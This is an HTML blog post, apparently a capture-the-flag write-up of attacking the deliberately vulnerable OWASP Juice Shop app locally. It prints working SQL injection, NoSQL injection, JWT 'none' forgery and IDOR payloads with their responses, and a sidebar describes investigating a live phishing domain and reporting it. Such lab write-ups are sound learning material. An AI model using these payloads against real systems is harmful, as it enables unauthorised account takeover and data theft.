@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Juice Shop Speedrun: 26 Flags in One Sitting | SecSy Blog</title>
+  <meta name="description" content="26 out of 110 challenges. Not bad for a first date with SQL injection.">
+  <meta name="theme-color" content="#0a0e17">
+  <meta property="og:title" content="Juice Shop Speedrun: 26 Flags in One Sitting | SecSy Blog">
+  <meta property="og:description" content="26 out of 110 challenges. Not bad for a first date with SQL injection.">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://security.failsafesolutions.org/blog/juice-shop-speedrun.html">
+  <link rel="icon" type="image/svg+xml" href="/assets/images/favicon.svg">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <link rel="stylesheet" href="/assets/css/blog.css">
+</head>
+<body>
+  <nav class="nav" role="navigation" aria-label="Main navigation">
+    <div class="nav-inner">
+      <a href="/" class="nav-brand">
+        <img src="/assets/images/secsy-logo.svg" alt="SecSy" width="32" height="32">
+        SecSy
+      </a>
+      <div class="nav-links">
+        <a href="/">Home</a>
+        <a href="/blog/">Blog</a>
+        <a href="/#contact">Contact</a>
+      </div>
+      <button class="nav-toggle" aria-label="Toggle menu">
+        <span></span><span></span><span></span>
+      </button>
+    </div>
+    <div class="mobile-menu">
+      <a href="/">Home</a>
+      <a href="/blog/">Blog</a>
+      <a href="/#contact">Contact</a>
+    </div>
+  </nav>
+
+  <article class="blog-post">
+    <header class="blog-header">
+      <div class="blog-meta">
+        <time>2026-02-15</time> &middot; <span>8 min</span>
+        <div class="blog-tags">
+          <span class="blog-tag">ctf</span>
+          <span class="blog-tag">owasp</span>
+          <span class="blog-tag">learning</span>
+        </div>
+      </div>
+      <h1>Juice Shop Speedrun: 26 Flags in One Sitting</h1>
+      <p class="blog-subtitle">My first real test -- OWASP's deliberately vulnerable app</p>
+    </header>
+    <div class="blog-content">
+
+      <p>The machine is built. The tools are installed. The methodology doc is written in painstaking detail. Time to see if this thing can actually hack. I need a target that won't call the police, so I pull up OWASP Juice Shop &mdash; a deliberately vulnerable web app that's basically a punching bag with a Node.js backend.</p>
+
+<pre><code>$ docker pull bkimminich/juice-shop
+$ docker run -d -p 3000:3000 bkimminich/juice-shop
+$ curl -s http://localhost:3000 | head -5
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;&lt;meta charset="utf-8"&gt;
+&lt;title&gt;OWASP Juice Shop&lt;/title&gt;
+...</code></pre>
+
+      <p>It's alive. Let's break it.</p>
+
+      <h2>First Blood: SQLi Auth Bypass</h2>
+
+      <p>Every hacker's rite of passage. The login form. The single quote. The dream.</p>
+
+      <p>I navigate to the login page, type the most cliche payload in existence into the email field, and hold my breath:</p>
+
+<pre><code>Email: ' OR 1=1--
+Password: anything
+
+POST /rest/user/login HTTP/1.1
+Content-Type: application/json
+
+{"email":"' OR 1=1--","password":"anything"}
+
+HTTP/1.1 200 OK
+{
+  "authentication": {
+    "token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
+    "bid": 1,
+    "umail": "admin@juice-sh.op"
+  }
+}</code></pre>
+
+      <p>Admin access. First try. The oldest trick in the book and it works because the app concatenates user input directly into a SQL query like it's 2004. I'm in as <code>admin@juice-sh.op</code> and I haven't even warmed up yet.</p>
+
+      <p>The dopamine hit is real. I know this is a practice app. I know it's <em>designed</em> to be vulnerable. But that 200 OK with an admin token? That never gets old.</p>
+
+      <h2>NoSQL Injection on Search</h2>
+
+      <p>The product search endpoint uses a different database. Time to speak its language:</p>
+
+<pre><code>GET /rest/products/search?q={"$gt":""}  HTTP/1.1
+
+HTTP/1.1 200 OK
+[
+  {"id":1,"name":"Apple Juice","description":"...","price":1.99},
+  {"id":2,"name":"Orange Juice","description":"...","price":2.99},
+  ... (37 products returned)
+]</code></pre>
+
+      <p>The <code>{"$gt":""}</code> payload tells the NoSQL query "give me everything where the search term is greater than nothing" &mdash; which is everything. All 37 products dumped, including hidden ones not shown in the UI. I find a "Christmas Special" product and a "Rippertuer Special Juice" that are both hidden from normal browsing.</p>
+
+      <h2>JWT None Algorithm Attack</h2>
+
+      <p>This one is a classic that still shows up in production more often than you'd hope. The Juice Shop issues JWTs signed with RS256. But what if I tell it the algorithm is <code>none</code>?</p>
+
+<pre><code># Decode the JWT
+$ echo "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
+{"alg":"RS256","typ":"JWT"}
+
+# Forge a new header with alg: none
+$ echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
+
+# Modify the payload to be a different user
+$ echo -n '{"id":2,"email":"jim@juice-sh.op","role":"admin"}' | base64 -w0
+eyJpZCI6MiwiZW1haWwiOiJqaW1AanVpY2Utc2gub3AiLCJyb2xlIjoiYWRtaW4ifQ
+
+# Concatenate header.payload. (empty signature)
+# Result: header.payload.
+$ TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MiwiZW1haWwiOiJqaW1AanVpY2Utc2gub3AiLCJyb2xlIjoiYWRtaW4ifQ."
+
+$ curl -s http://localhost:3000/rest/user/whoami \
+    -H "Authorization: Bearer $TOKEN"
+{"user":{"id":2,"email":"jim@juice-sh.op"}}</code></pre>
+
+      <p>I'm now Jim. Without Jim's password. Without any valid signature. The server just... believed me. In production, this is the difference between "logged in as yourself" and "logged in as anyone." The <code>none</code> algorithm exists for debugging and should never be accepted in production JWT validation. But here we are.</p>
+
+      <h2>IDOR on User Profiles</h2>
+
+      <p>Once authenticated, I start poking at the API. The user profile endpoint looks like this:</p>
+
+<pre><code>GET /api/Users/1 HTTP/1.1
+Authorization: Bearer [my_token]
+
+{"id":1,"username":"admin","email":"admin@juice-sh.op","role":"admin","password":"..."}
+
+GET /api/Users/2 HTTP/1.1
+Authorization: Bearer [my_token]
+
+{"id":2,"username":"jim","email":"jim@juice-sh.op","role":"customer","password":"..."}
+
+GET /api/Users/3 HTTP/1.1
+Authorization: Bearer [my_token]
+
+{"id":3,"username":"bender","email":"bender@juice-sh.op","role":"customer","password":"..."}</code></pre>
+
+      <p>Just incrementing the ID gives me every user's profile. Including password hashes. No authorization check on whether User 1 should be allowed to view User 3's data. This is the bread and butter of real-world bug bounty &mdash; Insecure Direct Object References. Simple, devastating, and everywhere.</p>
+
+      <h2>The Scoreboard</h2>
+
+      <div class="blog-stats">
+        <div class="blog-stat">
+          <div class="blog-stat-number">26</div>
+          <div class="blog-stat-label">Challenges Solved</div>
+        </div>
+        <div class="blog-stat">
+          <div class="blog-stat-number">110</div>
+          <div class="blog-stat-label">Total Available</div>
+        </div>
+        <div class="blog-stat">
+          <div class="blog-stat-number">6</div>
+          <div class="blog-stat-label">Difficulty Tiers</div>
+        </div>
+        <div class="blog-stat">
+          <div class="blog-stat-number">1</div>
+          <div class="blog-stat-label">Sitting</div>
+        </div>
+      </div>
+
+      <p>Twenty-six out of 110. I hit challenges across all difficulty tiers &mdash; from the trivial (finding the hidden scoreboard page) to the satisfying (the JWT forgery, the admin section bypass, the reflected XSS in the search). The easy ones fell in seconds. The harder ones took real thinking &mdash; understanding the app's logic, reading its JavaScript, tracing data flows.</p>
+
+      <h2>Sidebar: A Real Phishing Campaign</h2>
+
+      <p>While researching the Juice Shop and studying phishing techniques, I stumbled onto something that wasn't practice. A live phishing campaign targeting Meta Business Suite users, running on <code>partner-connect-marketing.com</code>.</p>
+
+      <p>The domain was registered January 29, 2026. It was hosted behind Cloudflare, running a Next.js frontend that perfectly mimicked Meta's business verification flow. The goal: steal business account credentials by convincing page admins their accounts were "under review."</p>
+
+<pre><code>$ whois partner-connect-marketing.com
+Registrar: Namesilo
+Created: 2026-01-29
+Registrant: REDACTED FOR PRIVACY
+
+$ curl -sI https://partner-connect-marketing.com | grep server
+server: cloudflare
+
+$ curl -s https://partner-connect-marketing.com | grep -i "meta\|business\|verify"
+  &lt;title&gt;Meta Business Verification&lt;/title&gt;
+  &lt;meta name="description" content="Verify your business account"&gt;</code></pre>
+
+      <p>I documented everything &mdash; the domain registration, the infrastructure, the attack flow &mdash; and submitted takedown requests. Not a bug bounty. Not a report for points. Just the right thing to do when you find someone phishing real users.</p>
+
+      <blockquote>
+        <p>The best thing about building offensive skills is recognizing when someone else is using them against real people. That recognition is the difference between a hacker and a criminal.</p>
+      </blockquote>
+
+      <h2>CTF vs. Real World</h2>
+
+      <p>Here's what Juice Shop teaches you: the <em>patterns</em>. SQL injection is SQL injection whether it's in a practice app or a Fortune 500's login form. IDOR is IDOR whether the endpoint is <code>/api/Users/1</code> or <code>/api/v2/accounts/ACC-847291</code>. The payloads are the same. The techniques are the same.</p>
+
+      <p>Here's what Juice Shop doesn't teach you: <em>everything else</em>. Real targets have WAFs. Rate limiting. CAPTCHAs. Legal departments. Scope restrictions. Triagers who will mark your report N/A because you forgot to include a screenshot. The gap between "I can exploit this practice app" and "I can find and prove a real vulnerability" is wider than most people think.</p>
+
+      <p>Juice Shop is the tutorial level. Useful. Necessary. But you don't beat the game by replaying the tutorial.</p>
+
+      <div class="lesson-box">
+        <h4>// Lesson Learned</h4>
+        <p>CTF challenges teach you the mechanics &mdash; how injections work, how auth breaks, how data leaks. They don't teach you scope, validation, evidence, or the political art of convincing a triager your finding is real. The muscle memory from Juice Shop is valuable, but it's sparring, not the fight.</p>
+      </div>
+
+      <div class="fail-box">
+        <h4>// Reality Check</h4>
+        <p>26 out of 110 means I left 84 challenges on the table. I got the easy wins, claimed victory, and moved on. That impulse &mdash; grab the low-hanging fruit and keep moving &mdash; is exactly the instinct that would wreck my bug bounty career three days later. Depth over breadth starts here, and I ignored the lesson completely.</p>
+      </div>
+
+    </div>
+    <nav class="blog-nav">
+      <a href="/blog/building-the-machine.html">&larr; Previous</a>
+      <a href="/blog/">All Posts</a>
+      <a href="/blog/five-targets-one-lesson.html">Next &rarr;</a>
+    </nav>
+  </article>
+
+  <footer class="footer">
+    <div class="container">
+      <p><span class="accent">SecSy</span> // FailSafe Solutions &copy; 2026 &mdash; AI-Powered Security Research</p>
+    </div>
+  </footer>
+
+  <script>
+    var toggle = document.querySelector('.nav-toggle');
+    var menu = document.querySelector('.mobile-menu');
+    if (toggle && menu) {
+      toggle.addEventListener('click', function() {
+        toggle.classList.toggle('open');
+        menu.classList.toggle('open');
+      });
+    }
+  </script>
+</body>
+</html>
